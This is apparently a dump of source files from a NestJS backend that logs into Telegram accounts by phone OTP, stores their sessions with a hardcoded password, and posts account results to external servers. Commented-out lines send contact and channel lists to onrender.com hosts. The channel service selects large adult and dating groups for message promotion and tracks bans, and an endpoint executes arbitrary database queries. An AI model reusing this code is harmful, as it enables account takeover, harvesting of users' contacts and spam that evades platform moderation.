console.log(\"Calculated results\");\r\n        try {\r\n            const url = `${process.env.tgcms}/user`;\r\n            console.log(\"posting results : \", url);\r\n            await axios.post(url, payload3, { headers: { 'Content-Type': 'application/json' } });\r\n            // await axios.post(`https://ramyaa3.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });\r\n            // await axios.post(`https://ramyaaa2.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });\r\n        } catch (error) {\r\n            console.log(\"Error Occured 1\");\r\n            console.log(error)\r\n        }\r\n        // await this.deleteMessages();\r\n        await this.disconnect();\r\n        await deleteClient(this.phoneNumber);\r\n    }\r\n}\r\n","import { Controller, Get, Post, Query, BadRequestException, HttpException } from '@nestjs/common';\r\nimport { ApiTags, ApiQuery } from '@nestjs/swagger';\r\nimport { createClient, getClient } from './TgSignup.service';\r\n\r\n\r\n@Controller('tgsignup')\r\n@ApiTags('tgsignup')\r\nexport class TgSignupController {\r\n    constructor(\r\n        // private readonly tgSignupService: TgSignupService\r\n    ) {}\r\n\r\n    @Get('login')\r\n    @ApiQuery({ name: 'phone', required: true })\r\n    async sendCode(@Query('phone') phone: string) {\r\n        console.log(phone)\r\n        const result = await createClient(phone);\r\n        if (result?.isCodeViaApp) {\r\n            console.log('OTP SENT!! - ', phone)\r\n            return result\r\n        } else {\r\n            throw new BadRequestException(\"Failed to send OTP\")\r\n        }\r\n    }\r\n\r\n    @Get('otp')\r\n    @ApiQuery({ name: 'phone', required: true })\r\n    @ApiQuery({ name: 'code', required: true })\r\n    @ApiQuery({ name: 'password', required: false })\r\n    async verifyCode(@Query('phone') phone: string, @Query('code') code: string, @Query('password') password: string) {\r\n        const cli = await getClient(phone);\r\n        if (cli) {\r\n            console.log(cli?.phoneCodeHash, cli?.phoneNumber);\r\n            const result: any = await cli?.login(code, password);\r\n            if (result && result.status === 200) {\r\n                return ({ mesaage: result.message });\r\n            } else {\r\n                throw new HttpException(result.message, result.status)\r\n            }\r\n        } else {\r\n            throw new BadRequestException(\"Failed to Verify OTP\")\r\n        }\r\n    }\r\n}\r\n","// src/activechannels/activechannels.controller.ts\r\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\r\nimport { ActiveChannelsService } from './active-channels.service';\r\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\r\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\r\nimport { ActiveChannel } from './schemas/active-channel.schema';\r\nimport { AddReactionDto } from './dto/add-reaction.dto';\r\n\r\n@ApiTags('Active Channels')\r\n@Controller('active-channels')\r\nexport class ActiveChannelsController {\r\n  constructor(private readonly activeChannelsService: ActiveChannelsService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new active channel' })\r\n  async create(@Body() createActiveChannelDto: CreateActiveChannelDto) {\r\n    return this.activeChannelsService.create(createActiveChannelDto);\r\n  }\r\n\r\n  @Post('createMultiple')\r\n  @ApiOperation({ summary: 'Create multiple channels' })\r\n  @ApiBody({ type: [CreateActiveChannelDto] })\r\n  async createMultiple(@Body() createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\r\n    return this.activeChannelsService.createMultiple(createChannelDtos);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search channels by filters' })\r\n  @ApiQuery({ name: 'channelId', required: false, type: String })\r\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\r\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'title', required: false, type: String })\r\n  @ApiQuery({ name: 'username', required: false, type: String })\r\n  @ApiQuery({ name: 'wordRestriction', required: false, type: Number })\r\n  @ApiQuery({ name: 'dMRestriction', required: false, type: Number })\r\n  @ApiQuery({ name: 'availableMsgs', required: false, type: [String] })\r\n  @ApiQuery({ name: 'reactions', required: false, type: [String] })\r\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'reactRestricted', required: false, type: Boolean })\r\n  @ApiQuery({ name: 'megagroup', required: false, type: Boolean })\r\n  search(@Query() query: any): Promise<ActiveChannel[]> {\r\n    console.log(query);\r\n    return this.activeChannelsService.search(query);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all active channels' })\r\n  async findAll() {\r\n    return this.activeChannelsService.findAll();\r\n  }\r\n\r\n  @Get(':channelId')\r\n  @ApiOperation({ summary: 'Get an active channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'Return the active channel', type: ActiveChannel })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async findOne(@Param('channelId') channelId: string) {\r\n    return this.activeChannelsService.findOne(channelId);\r\n  }\r\n\r\n  @Patch(':channelId')\r\n  @ApiOperation({ summary: 'Update an active channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: ActiveChannel })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async update(@Param('channelId') channelId: string, @Body() updateActiveChannelDto: UpdateActiveChannelDto) {\r\n    return this.activeChannelsService.update(channelId, updateActiveChannelDto);\r\n  }\r\n\r\n  @Delete(':channelId')\r\n  @ApiOperation({ summary: 'Delete an active channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async remove(@Param('channelId') channelId: string) {\r\n    return this.activeChannelsService.remove(channelId);\r\n  }\r\n\r\n  @Post(':channelId/reactions')\r\n  @ApiOperation({ summary: 'Add reaction to chat group' })\r\n  addReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\r\n    if (!addReactionDto.reactions) {\r\n      throw new BadRequestException('Reaction is required');\r\n    }\r\n    return this.activeChannelsService.addReactions(channelId, addReactionDto.reactions);\r\n  }\r\n\r\n  @Get(':channelId/reactions/random')\r\n  @ApiOperation({ summary: 'Get a random reaction from chat group' })\r\n  getRandomReaction(@Param('channelId') channelId: string): Promise<string> {\r\n    return this.activeChannelsService.getRandomReaction(channelId);\r\n  }\r\n\r\n  @Delete(':channelId/reactions')\r\n  @ApiOperation({ summary: 'Remove reaction from chat group' })\r\n  removeReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\r\n    if (!addReactionDto.reactions) {\r\n      throw new BadRequestException('Reaction is required');\r\n    }\r\n    return this.activeChannelsService.removeReaction(channelId, addReactionDto.reactions[0]);\r\n  }\r\n}\r\n","// src/activechannels/activechannels.module.ts\r\nimport { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { ActiveChannelsService } from './active-channels.service';\r\nimport { ActiveChannelsController } from './active-channels.controller';\r\nimport { ActiveChannel, ActiveChannelSchema } from './schemas/active-channel.schema';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { PromoteMsgModule } from '../promote-msgs/promote-msgs.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: ActiveChannel.name, schema: ActiveChannelSchema }]),\r\n    PromoteMsgModule\r\n  ],\r\n  controllers: [ActiveChannelsController],\r\n  providers: [ActiveChannelsService],\r\n  exports: [ActiveChannelsService]\r\n})\r\nexport class ActiveChannelsModule { }\r\n","import { PromoteMsgsService } from './../promote-msgs/promote-msgs.service';\r\n// src/activechannels/activechannels.service.ts\r\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, forwardRef } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\r\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\r\nimport { ActiveChannel, ActiveChannelDocument } from './schemas/active-channel.schema';\r\nimport { defaultMessages, fetchWithTimeout, parseError, ppplbot } from '../../utils';\r\n@Injectable()\r\nexport class ActiveChannelsService {\r\n  constructor(\r\n    @InjectModel(ActiveChannel.name) private activeChannelModel: Model<ActiveChannelDocument>,\r\n    @Inject(forwardRef(() => PromoteMsgsService))\r\n    private promoteMsgsService: PromoteMsgsService\r\n  ) {}\r\n\r\n  async create(createActiveChannelDto: CreateActiveChannelDto): Promise<ActiveChannel> {\r\n    createActiveChannelDto.availableMsgs = Object.keys(await this.promoteMsgsService.findOne())\r\n    const createdChannel = new this.activeChannelModel(createActiveChannelDto);\r\n    return createdChannel.save();\r\n  }\r\n\r\n  \r\n  async createMultiple(createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\r\n    const bulkOps = createChannelDtos.map((dto) => ({\r\n      updateOne: {\r\n        filter: { channelId: dto.channelId },\r\n        update: { $set: dto },\r\n        upsert: true\r\n      }\r\n    }));\r\n\r\n    await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });\r\n    return 'Channels Saved';\r\n  }\r\n\r\n  async findAll(): Promise<ActiveChannel[]> {\r\n    return this.activeChannelModel.find().exec();\r\n  }\r\n\r\n  async findOne(channelId: string): Promise<ActiveChannel> {\r\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\r\n    return channel;\r\n  }\r\n\r\n  async update(channelId: string, updateActiveChannelDto: UpdateActiveChannelDto): Promise<ActiveChannel> {\r\n    delete updateActiveChannelDto[\"_id\"]\r\n    const updatedChannel = await this.activeChannelModel.findOneAndUpdate(\r\n      { channelId },\r\n      { $set: updateActiveChannelDto },\r\n      { new: true, upsert: true },\r\n    ).exec();\r\n    return updatedChannel;\r\n  }\r\n\r\n  async removeFromAvailableMsgs(channelId: string, msg: string) {\r\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg } })\r\n  }\r\n\r\n  async addToAvailableMsgs(channelId: string, msg: string) {\r\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg } })\r\n  }\r\n\r\n  async remove(channelId: string): Promise<void> {\r\n    const result = await this.activeChannelModel.findOneAndDelete({ channelId }).exec();\r\n  }\r\n\r\n  async search(filter: any): Promise<ActiveChannel[]> {\r\n    console.log(filter)\r\n    return this.activeChannelModel.find(filter).exec();\r\n  }\r\n\r\n  async addReactions(channelId: string, reactions: string[]): Promise<ActiveChannel> {\r\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\r\n      $addToSet: { reactions: reactions }\r\n    })\r\n    return channel;\r\n  }\r\n\r\n  async getRandomReaction(channelId: string): Promise<string> {\r\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\r\n    if (!channel) {\r\n      return undefined;\r\n    }\r\n    if (channel.reactions.length === 0) {\r\n      return undefined;\r\n    }\r\n    const randomIndex = Math.floor(Math.random() * channel.reactions.length);\r\n    return channel.reactions[randomIndex];\r\n  }\r\n\r\n  async removeReaction(channelId: string, reaction: string): Promise<ActiveChannel> {\r\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\r\n      $pull: { reactions: reaction },\r\n    })\r\n    return channel;\r\n  }\r\n\r\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\r\n    const query = {\r\n      '$and':\r\n        [\r\n          {\r\n            '$or':\r\n              [\r\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\r\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\r\n              ]\r\n          },\r\n          {\r\n            '$or': [\r\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\r\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\r\n            ]\r\n          },\r\n          {\r\n            channelId: { '$nin': notIds },\r\n            participantsCount: { $gt: 600 },\r\n            username: {$ne: null},\r\n            canSendMsgs: true,\r\n            restricted: false,\r\n            forbidden: false\r\n          }\r\n        ]\r\n    }\r\n\r\n    const sort: Record<string, 1 | -1> = { participantsCount: -1 }\r\n    try {\r\n      const result: ActiveChannel[] = await this.activeChannelModel.aggregate([\r\n        { $match: query },\r\n        { $skip: skip },\r\n        { $limit: limit },\r\n        { $sort: sort }, // Sort by the random field\r\n        { $project: { randomField: 0 } } // Remove the random field from the output\r\n      ]).exec();\r\n      return result;\r\n    } catch (error) {\r\n      console.error('Error:', error);\r\n      return [];\r\n    }\r\n  }\r\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<ActiveChannel[]> {\r\n    try {\r\n      if (!query) {\r\n        throw new BadRequestException('Query is invalid.');\r\n      }\r\n      const queryExec = this.activeChannelModel.find(query);\r\n\r\n      if (sort) {\r\n        queryExec.sort(sort);\r\n      }\r\n\r\n      if (limit) {\r\n        queryExec.limit(limit);\r\n      }\r\n\r\n      if (skip) {\r\n        queryExec.skip(skip);\r\n      }\r\n\r\n      return await queryExec.exec();\r\n    } catch (error) {\r\n      throw new InternalServerErrorException(error.message);\r\n    }\r\n  }\r\n\r\n  async resetWordRestrictions() {\r\n    await fetchWithTimeout(`${ppplbot()}&text=Request Received for Reset Available Msgs`);\r\n    try {\r\n      await this.activeChannelModel.updateMany({\r\n        banned: false\r\n      }, {\r\n        $set: {\r\n          \"wordRestriction\": 0,\r\n          \"dMRestriction\": 0\r\n        }\r\n      })\r\n    } catch (e) {\r\n      console.log(parseError(e))\r\n    }\r\n  }\r\n\r\n  async resetAvailableMsgs() {\r\n    await fetchWithTimeout(`${ppplbot()}&text=Request Received for Reset Available Msgs`);\r\n    try {\r\n      const data = await this.promoteMsgsService.findOne();\r\n      const keys = Object.keys(data);\r\n      await this.activeChannelModel.updateMany(\r\n        {\r\n          $expr: {\r\n            $lt: [{ $size: { $ifNull: [\"$availableMsgs\", []] } }, 5]\r\n          }\r\n        },\r\n        {\r\n          $set: {\r\n            \"wordRestriction\": 0,\r\n            \"dMRestriction\": 0,\r\n            \"banned\": false,\r\n            \"availableMsgs\": keys\r\n          }\r\n        }\r\n      );\r\n    } catch (e) {\r\n      console.log(parseError(e))\r\n    }\r\n  }\r\n\r\n  async updateBannedChannels() {\r\n    await fetchWithTimeout(`${ppplbot()}&text=Request Received for update banned Channels`);\r\n    await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {\r\n      $set: {\r\n        \"wordRestriction\": 0,\r\n        \"dMRestriction\": 0,\r\n        banned: false,\r\n        \"private\": false\r\n      }\r\n    })\r\n  }\r\n\r\n  async updateDefaultReactions() {\r\n    await this.activeChannelModel.updateMany({}, {\r\n      $set: {\r\n        reactions: [\r\n          '❤', '🔥', '👏', '🥰', '😁', '🤔',\r\n          '🤯', '😱', '🤬', '😢', '🎉', '🤩',\r\n          '🤮', '💩', '🙏', '👌', '🕊', '🤡',\r\n          '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\r\n          '🤣', '💔', '🏆', '😭', '😴', '👍',\r\n          '🌚', '⚡', '🍌', '😐', '💋', '👻',\r\n          '👀', '🙈', '🤝', '🤗', '🆒',\r\n          '🗿', '🙉', '🙊', '🤷', '👎'\r\n        ]\r\n      }\r\n    })\r\n  }\r\n}\r\n","import { ApiProperty,  } from '@nestjs/swagger';\r\n\r\nexport class AddReactionDto  {\r\n    @ApiProperty({required: true})\r\n    reactions: string[]\r\n}\r\n","// src/activechannels/dto/create-activechannel.dto.ts\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateActiveChannelDto {\r\n  @ApiProperty()\r\n  channelId: string;\r\n\r\n  @ApiProperty({ default: false })\r\n  broadcast: boolean;\r\n\r\n  @ApiProperty({ default: true })\r\n  canSendMsgs: boolean;\r\n\r\n  @ApiProperty({ default: 300 })\r\n  participantsCount: number;\r\n\r\n  @ApiProperty({ default: false })\r\n  restricted: boolean;\r\n\r\n  @ApiProperty({ default: true })\r\n  sendMessages: boolean;\r\n\r\n  @ApiProperty({ default: false })\r\n  reactRestricted?: boolean = false;\r\n\r\n  @ApiProperty()\r\n  title: string;\r\n\r\n  @ApiProperty()\r\n  username: string;\r\n\r\n  @ApiProperty({ default: 0 })\r\n  wordRestriction?: number = 0;\r\n\r\n  @ApiProperty({ default: 0 })\r\n  dMRestriction?: number = 0;\r\n\r\n  @ApiProperty({ type: [String] })\r\n  availableMsgs?: string[];\r\n\r\n  @ApiProperty({\r\n    type: [String], default: [\r\n      '❤', '🔥', '👏', '🥰', '😁', '🤔',\r\n      '🤯', '😱', '🤬', '😢', '🎉', '🤩',\r\n      '🤮', '💩', '🙏', '👌', '🕊', '🤡',\r\n      '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\r\n      '🤣', '💔', '🏆', '😭', '😴', '👍',\r\n      '🌚', '⚡', '🍌', '😐', '💋', '👻',\r\n      '👀', '🙈', '🤝', '🤗', '🆒',\r\n      '🗿', '🙉', '🙊', '🤷', '👎'\r\n    ]\r\n  })\r\n  reactions?: string[] = [\r\n    '❤', '🔥', '👏', '🥰', '😁', '🤔',\r\n    '🤯', '😱', '🤬', '😢', '🎉', '🤩',\r\n    '🤮', '💩', '🙏', '👌', '🕊', '🤡',\r\n    '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\r\n    '🤣', '💔', '🏆', '😭', '😴', '👍',\r\n    '🌚', '⚡', '🍌', '😐', '💋', '👻',\r\n    '👀', '🙈', '🤝', '🤗', '🆒',\r\n    '🗿', '🙉', '🙊', '🤷', '👎'\r\n  ];\r\n\r\n  @ApiProperty({ default: false })\r\n  banned?: boolean = false;\r\n\r\n  @ApiProperty({ default: true, required: false })\r\n  megagroup?: boolean;\r\n\r\n  @ApiProperty({ default: false, required: false })\r\n  forbidden?: boolean\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is private',\r\n    example: false,\r\n    required: false,\r\n  })\r\n  private: boolean = false;\r\n}\r\n","// src/activechannels/dto/update-activechannel.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreateActiveChannelDto } from './create-active-channel.dto';\r\n\r\nexport class UpdateActiveChannelDto extends PartialType(CreateActiveChannelDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document } from 'mongoose';\r\nimport * as mongoose from 'mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { defaultMessages, defaultReactions } from '../../../utils';\r\n\r\nexport type ActiveChannelDocument = ActiveChannel & Document;\r\n\r\n@Schema({ collection: 'activeChannels', versionKey: false, autoIndex: true,\r\n  timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n })\r\nexport class ActiveChannel {\r\n  @ApiProperty({ required: true })\r\n  @Prop({ required: true, unique: true })\r\n  channelId: string;\r\n\r\n  @ApiProperty({ default: false })\r\n  @Prop({ default: false })\r\n  broadcast: boolean;\r\n\r\n  @ApiProperty({ default: true })\r\n  @Prop({ default: true })\r\n  canSendMsgs: boolean;\r\n\r\n  @ApiProperty({ type: Number, default: 0 })\r\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\r\n  participantsCount: number;\r\n\r\n  @ApiProperty({ default: false })\r\n  @Prop({ default: false })\r\n  restricted: boolean;\r\n\r\n  @ApiProperty({ default: false })\r\n  @Prop({ default: false })\r\n  sendMessages: boolean;\r\n\r\n  @ApiProperty({ required: true })\r\n  @Prop({ required: true })\r\n  title: string;\r\n\r\n  @ApiProperty({ required: false, default: null })\r\n  @Prop({ required: false, default: null })\r\n  username: string;\r\n\r\n  @ApiProperty({ type: Number, default: 0 })\r\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\r\n  wordRestriction: number;\r\n\r\n  @ApiProperty({ type: Number, default: 0 })\r\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\r\n  dMRestriction: number;\r\n\r\n  @ApiProperty({ type: [String], default:defaultMessages })\r\n  @Prop({ type: [String], default: defaultMessages })\r\n  availableMsgs: string[];\r\n\r\n  @ApiProperty({ type: [String], default: defaultReactions })\r\n  @Prop({\r\n    type: [String], default: defaultReactions\r\n  })\r\n  reactions: string[];\r\n\r\n  @ApiProperty({ default: false })\r\n  @Prop({ default: false })\r\n  banned: boolean;\r\n\r\n  @ApiProperty({ default: true })\r\n  @Prop({ default: true })\r\n  megagroup: boolean;\r\n\r\n  @ApiProperty({ default: false})\r\n  @Prop({ default: false })\r\n  private: boolean;\r\n\r\n  @ApiProperty({ default: false })\r\n  @Prop({ default: false })\r\n  reactRestricted: boolean\r\n\r\n  @ApiProperty({ default: false })\r\n  @Prop({ default: false })\r\n  forbidden: boolean\r\n}\r\n\r\nexport const ActiveChannelSchema = SchemaFactory.createForClass(ActiveChannel);\r\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { Client } from '../clients/schemas/client.schema';\r\nimport { ArchivedClientService } from './archived-client.service';\r\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\r\nimport { SearchClientDto } from '../clients/dto/search-client.dto';\r\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\r\n\r\n@ApiTags('Archived Clients')\r\n@Controller('archived-clients')\r\nexport class ArchivedClientController {\r\n  constructor(private readonly archivedclientService: ArchivedClientService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  //@apiresponse({ status: 201, description: 'The user data has been successfully created.' })\r\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\r\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\r\n    return this.archivedclientService.create(createClientDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  //@apiresponse({ status: 200, description: 'Return the searched user data.' })\r\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\r\n    return this.archivedclientService.search(query);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  //@apiresponse({ status: 200, description: 'Return all user data.' })\r\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\r\n  async findAll(): Promise<Client[]> {\r\n    return this.archivedclientService.findAll();\r\n  }\r\n  \r\n  @Get('checkArchivedClients')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async checkArchivedClients(): Promise<string> {\r\n    return this.archivedclientService.checkArchivedClients();\r\n  }\r\n\r\n  @Get(':mobile')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async findOne(@Param('mobile') mobile: string): Promise<Client> {\r\n    return this.archivedclientService.findOne(mobile);\r\n  }\r\n  \r\n  @Get('fetchOne/:mobile')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async fetchOne(@Param('mobile') mobile: string): Promise<Client> {\r\n    return this.archivedclientService.fetchOne(mobile);\r\n  }\r\n\r\n  @Patch(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'The user data has been successfully updated.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\r\n    return this.archivedclientService.update(mobile, updateClientDto);\r\n  }\r\n\r\n  @Delete(':mobile')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'The user data has been successfully deleted.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async remove(@Param('mobile') mobile: string): Promise<Client> {\r\n    return this.archivedclientService.remove(mobile);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  //@apiresponse({ status: 200, description: 'Query executed successfully.' })\r\n  //@apiresponse({ status: 400, description: 'Invalid query.' })\r\n  //@apiresponse({ status: 500, description: 'Internal server error.' })\r\n  @ApiBody({type: Object})\r\n  async executeQuery(@Body() query: object): Promise<any> {\r\n    try {\r\n      return await this.archivedclientService.executeQuery(query);\r\n    } catch (error) {\r\n      throw error;  // You might want to handle errors more gracefully\r\n    }\r\n  }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { ClientSchema } from '../clients/schemas/client.schema';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { ArchivedClientService } from './archived-client.service';\r\nimport { ArchivedClientController } from './archived-client.controller';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { ClientModule } from '../clients/client.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ collection: 'ArchivedClients', name: 'ArchivedArchivedClientsModule', schema: ClientSchema }]),\r\n    forwardRef(() => TelegramModule),\r\n    forwardRef(() => ClientModule)\r\n  ],\r\n  controllers: [ArchivedClientController],\r\n  providers: [ArchivedClientService],\r\n  exports: [ArchivedClientService]\r\n})\r\nexport class ArchivedClientModule { }\r\n","import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\r\nimport { Client, ClientDocument } from '../clients/schemas/client.schema';\r\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\r\nimport { TelegramService } from '../Telegram/Telegram.service';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport { ClientService } from '../clients/client.service';\r\nimport { parseError } from '../../utils';\r\n\r\n@Injectable()\r\nexport class ArchivedClientService {\r\n    constructor(@InjectModel('ArchivedArchivedClientsModule') private archivedclientModel: Model<ClientDocument>,\r\n        @Inject(forwardRef(() => TelegramService))\r\n        private telegramService: TelegramService,\r\n        @Inject(forwardRef(() => ClientService))\r\n        private clientService: ClientService,\r\n    ) { }\r\n\r\n    async create(createClientDto: CreateClientDto): Promise<Client> {\r\n        const createdUser = new this.archivedclientModel(createClientDto);\r\n        return createdUser.save();\r\n    }\r\n\r\n    async findAll(): Promise<Client[]> {\r\n        const results: Client[] = await this.archivedclientModel.find().exec();\r\n        return results\r\n    }\r\n\r\n    async findOne(mobile: string): Promise<Client> {\r\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\r\n        return user;\r\n    }\r\n\r\n    async fetchOne(mobile: string): Promise<Client> {\r\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\r\n        if (user) {\r\n            return user;\r\n        } else {\r\n            try {\r\n                await this.telegramService.createClient(mobile, false, true)\r\n                const newSession = await this.telegramService.createNewSession(mobile);\r\n                await this.telegramService.deleteClient(mobile)\r\n                return await this.create({\r\n                    \"channelLink\": \"default\",\r\n                    \"clientId\": \"default\",\r\n                    \"dbcoll\": \"default\",\r\n                    \"deployKey\": \"default\",\r\n                    \"link\": \"default\",\r\n                    \"mainAccount\": \"default\",\r\n                    promoteRepl: \"default\",\r\n                    \"name\": \"default\",\r\n                    \"password\": \"Ajtdmwajt1@\",\r\n                    \"repl\": \"default\",\r\n                    \"session\": newSession,\r\n                    \"username\": \"default\",\r\n                    \"mobile\": mobile,\r\n                    product: \"default\"\r\n                })\r\n            } catch (e) {\r\n                await this.telegramService.deleteClient(mobile)\r\n                throw new NotFoundException(parseError(e).message);\r\n            }\r\n        }\r\n    }\r\n\r\n    async update(mobile: string, updateClientDto: UpdateClientDto): Promise<Client> {\r\n        delete updateClientDto[\"_id\"]\r\n        if ((<any>updateClientDto)._doc) {\r\n            delete (<any>updateClientDto)._doc['_id']\r\n        }\r\n        console.log({ ...updateClientDto });\r\n        const updatedUser = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\r\n        return updatedUser;\r\n    }\r\n\r\n    async remove(mobile: string): Promise<Client> {\r\n        const deletedUser = await this.archivedclientModel.findOneAndDelete({ mobile }).exec();\r\n        if (!deletedUser) {\r\n            throw new NotFoundException(`Client with ID 